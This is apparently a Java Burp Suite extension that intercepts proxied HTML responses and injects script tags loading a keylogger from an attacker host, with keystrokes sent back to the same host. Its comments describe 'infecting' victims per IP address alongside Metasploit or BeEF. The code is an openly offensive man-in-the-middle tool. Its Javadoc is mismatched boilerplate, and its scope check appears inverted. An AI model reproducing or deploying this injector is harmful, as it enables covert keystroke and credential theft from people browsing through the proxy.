package burp;

import java.util.ArrayList;
import java.util.List;

/**
 * This extension registers listeners for various runtime events, and prints a message when each event occurs.
 * @author cmcneill
 * 
 * 
 * Configuration
 * ==============
 * 
 * 	mimeType				-	Desired MIME type to target
 * 
 *  infectOnlyInScope 		- 	Infect only pages matching the scope defined in Burp 
 *  
 *  duplicates				-	Manage infection duplicates
 *  								EVERY: do not manage duplicates / infect every page (if MIME type and scope are OK)
 *  								BY_IP: one infection by source IP address / useful when deploying client-side attacks (Metasploit, img on a SMB)
 *  								BY_IP_AND_SERVICE: one infection by source IP address and service / useful when using BeEF
 *  								BY_IP_AND_URL: one infection by source IP address and URL (including GET parameters) / useful when injecting FireBug Lite
 * 	
 * marker					- 	Value in response that should be changed
 * 
 * code						- 	Value in response that should be inserted in place of marker
 * 
 */
public class BurpExtender implements IBurpExtender, IProxyListener, IExtensionStateListener{
	
	private String mimeType = "HTML";
	private DuplicateType duplicates = DuplicateType.EVERY;
	private boolean infectOnlyInScope = false;
	private final String marker = "</body>";
	private final String code = "<script type='text/javascript' "
								+ "src='http://attacker.localhost.com/js/keylogger.js'>"
								+ "</script>"
								+ "<script type='text/javascript'>"
									+ "destination='http://attacker.localhost.com/Keylogger/?k=';"
								+ "</script>" + this.marker;
	
    /*
	* ====================================
	* =   Do not modify below this line  =
	* ====================================
    */
	private Logger logger;
	private IBurpExtenderCallbacks callbacks;
	private IExtensionHelpers helpers;
	private List<String> infectedHosts = new ArrayList<String>();
	private enum DuplicateType {
		EVERY,
		BY_IP,
		BY_IP_AND_SERVICE,
		BY_IP_AND_URL
	}
	
	
	public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) 
	{
		this.logger = new Logger(callbacks);
		this.callbacks = callbacks;
		this.helpers = callbacks.getHelpers();
		
        callbacks.setExtensionName("Replace response content with alternative data");
        callbacks.registerProxyListener(this);
	}
	
	public void extensionUnloaded() {
		logger.info("Extension was unloaded");
	}

	public void processProxyMessage(final boolean isRequest, final IInterceptedProxyMessage message) 
	{		
		if (isRequest)
			return;
		
		String clientIp = message.getClientIpAddress().getHostAddress();
		int messageRef = message.getMessageReference();

		byte[] response = message.getMessageInfo().getResponse();
		IResponseInfo parsedResponse = helpers.analyzeResponse(response);
		List<String> responseHeaders = parsedResponse.getHeaders();
		String responseBody = helpers.bytesToString(response).substring(parsedResponse.getBodyOffset());
		
		IHttpRequestResponse request = message.getMessageInfo();
		IRequestInfo parsedRequest = helpers.analyzeRequest(request);
		
		if(!messageInScopeAndTargetedMime(parsedRequest, parsedResponse, messageRef, clientIp))
			return;

		if(isDuplicate(message, clientIp, messageRef, parsedRequest))
			return;
		
		if (!responseBody.contains(marker)){
			logger.info("[-] #%d (%s) Response was NOT infected (no marker in body)", messageRef, clientIp );
			return;
		}
		
		message.getMessageInfo().setResponse( getUpdatedResponse(responseHeaders, responseBody) );
		logger.info("[+] #%d (%s) Response was infected! %s", messageRef, clientIp, parsedRequest.getUrl());
		
		// tag the message in Proxy / History
		message.getMessageInfo().setComment(String.format("Source '%s' was infected!", clientIp));
		message.getMessageInfo().setHighlight("yellow");
		
	}

	// Test if message should be treated as a duplicate and discarded
	private boolean isDuplicate(final IInterceptedProxyMessage message, 
								final String clientIp, 
								final int messageRef,
								final IRequestInfo parsedRequest) {
		
		final String sourceSignature;
		switch (duplicates) {
			case EVERY: 
				
				logger.info("[-] #%d (%s) Response will be infected (every response will be infected)", messageRef, clientIp );
				return false;
				
			case BY_IP:
				
				return infectedHosts.contains(clientIp);
			
			case BY_IP_AND_SERVICE:
				
				IHttpService service = message.getMessageInfo().getHttpService();
				sourceSignature = clientIp + "||" + service.getProtocol() + "://" + service.getHost() + ":" + service.getPort();
				break;
			case BY_IP_AND_URL:
			
				sourceSignature = clientIp + "||" + parsedRequest.getUrl();
			
				break;
			default:
			
				throw new RuntimeException("Invalid value for duplicates supplied");
				
		}
		
		if ( infectedHosts.contains(sourceSignature) ){
			logger.info("[-] #%d (%s) Response will NOT be infected (already infected)", messageRef, clientIp );
			return true;
		}
		
		infectedHosts.add(sourceSignature);
		return false;
	}

	private boolean messageInScopeAndTargetedMime(IRequestInfo parsedRequest, IResponseInfo parsedResponse, int messageRef, String clientIp) {
		// if needed, do not process out of scope messages
		if (!messageInScope(parsedRequest)) {
			logger.info("[-] #%d (%s) Response was NOT infected (not in scope)", messageRef, clientIp);
			return false;
		}

		if (!messageIsTargetedMime(parsedResponse)) {
			logger.info("[!] #%d (%s) Response was NOT infected (MIME type != '%s') ", messageRef, clientIp, mimeType);
			return false;
		}
		
		return true;
	}

	private byte[] getUpdatedResponse(List<String> messageHeaders, String messageBody) {
		return helpers.buildHttpMessage(
				messageHeaders, 
				helpers.stringToBytes(
						messageBody.replace(marker, code)));
	}

	private boolean messageInScope(IRequestInfo parsedRequest) {
		return infectOnlyInScope && !callbacks.isInScope(parsedRequest.getUrl());
	}

	private boolean messageIsTargetedMime(IResponseInfo parsedResponse) {
		return parsedResponse.getInferredMimeType().equalsIgnoreCase(mimeType);
	}

	
	
}